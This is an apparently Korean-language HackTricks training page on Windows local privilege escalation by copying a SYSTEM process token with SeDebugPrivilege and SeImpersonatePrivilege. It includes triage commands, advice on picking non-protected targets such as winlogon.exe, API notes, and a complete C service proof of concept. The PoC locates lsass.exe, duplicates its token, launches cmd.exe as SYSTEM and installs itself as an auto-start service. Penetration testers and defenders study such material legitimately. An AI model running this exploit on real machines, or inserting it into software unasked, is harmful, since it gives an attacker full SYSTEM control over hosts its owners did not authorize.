# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

이 페이지에서는 이미 **`SeDebugPrivilege`** 및 **`SeImpersonatePrivilege`**를 보유한 **High Integrity** context가 적절한 **SYSTEM** process를 열고, 해당 token을 **duplicate**한 다음, 그 token으로 새 process를 **spawn**하는 **manual token-theft** 변형을 다룹니다.

권한이 있는 admin process에서 빠르게 `SYSTEM` shell만 필요한 경우 다음도 확인하세요.

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

process-handle path는 없지만 **`SeImpersonatePrivilege`**가 있는 경우에는 일반적으로 **named-pipe / Potato** route가 더 쉽습니다.

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Quick triage

token-copy path를 시도하기 전에 현재 process가 이미 유용한 context에 있는지 확인하세요:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Notes:

- **`SeDebugPrivilege`**는 DACL이 일반적으로 접근을 차단하더라도 많은 **non-protected** SYSTEM 프로세스를 열 수 있게 합니다.
- **`SeImpersonatePrivilege`**는 이후 **`CreateProcessWithTokenW`**를 실용적으로 사용할 수 있게 합니다.
- token-copy 경로에서 weak 또는 filtered SYSTEM token만 얻어진다면, **다른 SYSTEM 프로세스**에서 token을 훔기면 됩니다.

## target process를 신중하게 선택하기

이 technique은 보통 **`lsass.exe`**를 대상으로 설명되지만, modern Windows에서는 종종 **잘못된 target**입니다:

- **LSA Protection / RunAsPPL**이 활성화되어 있으면 **`lsass.exe`**는 protected 상태이므로, **`SeDebugPrivilege`**를 가진 일반 admin process라도 이를 열 수 없습니다.<sup>[[2]](#references)</sup>
- **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** 또는 초기 **`svchost.exe`** instance처럼 **non-PPL SYSTEM process**를 우선 사용하세요.
- **Protected process**와 **System** 또는 **`csrss.exe`** 같은 일부 special process는 이 technique의 현실적인 user-mode target이 아닙니다.
- elevated 상태로 실행한 **Process Hacker / Process Explorer**를 사용하여 token을 duplicate하기 전에 target token에 원하는 privilege가 실제로 있는지 확인하세요.

## 실제 사용에서 중요한 API details

많은 public PoC는 **`PROCESS_ALL_ACCESS`**와 **`TOKEN_ALL_ACCESS`**를 요청하지만, 이는 필요 이상으로 noisy합니다. 실제로는:

- 필요한 권한만 사용하여 target process를 여세요(일반적으로 **`PROCESS_QUERY_INFORMATION`** 또는 **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- process creation에 필요한 권한으로 token을 여세요: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- **`DuplicateTokenEx(..., TokenPrimary, ...)`**를 사용하여 **primary token**을 만드세요. impersonation token만으로는 새 process를 생성할 수 없습니다.
- **`CreateProcessWithTokenW`**가 **`1314`**와 함께 실패하면 **`CreateProcessAsUserW`**로 전환하세요.
- **service / Session 0**에서 launch하는 경우, **`CreateProcessWithTokenW`**는 child를 **caller's session**에 그대로 둔다는 점을 기억하세요. visible desktop shell이 필요하다면 **`CreateProcessAsUserW`**를 사용하고 token을 원하는 session으로 이동하세요.<sup>[[1]](#references)</sup>

최소한의 modern flow는 다음과 같습니다:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Full service PoC

다음 코드는 **SeDebugPrivilege 및 SeImpersonatePrivilege 권한을 악용하여**, **SYSTEM으로 실행 중이며 모든 token privileges를 가진 프로세스**에서 token을 복사합니다. 이 경우 코드를 컴파일하여 **Windows service binary**로 사용함으로써 해당 primitive가 작동하는지 확인할 수 있습니다.<sup>[[3]](#references)</sup>

**elevation이 발생하는 code의 주요 부분**은 **`Exploit` function** 내부에 있습니다. 해당 function을 보면 **`lsass.exe`를 검색하고**, 해당 **token을 복사한 다음**, 마지막으로 그 token을 사용하여 복사된 token의 모든 privileges를 가진 새로운 **`cmd.exe`**를 생성하는 것을 확인할 수 있습니다.

최신 호스트에서는 **`lsass.exe`**를 **`winlogon.exe`**, **`wininit.exe`** 또는 **`services.exe`**와 같은 다른 **non-PPL SYSTEM process**로 교체하는 경우가 많습니다.

모든 또는 대부분의 token privileges를 가진 SYSTEM으로 실행되는 다른 프로세스로는 **`services.exe`**, **`svchost.exe`** (일부 초기 프로세스), **`wininit.exe`**, **`csrss.exe`** 등이 있습니다. 일반적으로 **protected process에서 token을 복사할 수 없다는 점**을 기억하세요.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## References

- [1] [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [추가 LSA protection 구성 (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
- [3] [내 프로그램을 service로 실행하기 (cboard.cprogramming.com) – PoC에서 사용한 Windows service skeleton](https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html)

{{#include ../../banners/hacktricks-training.md}}
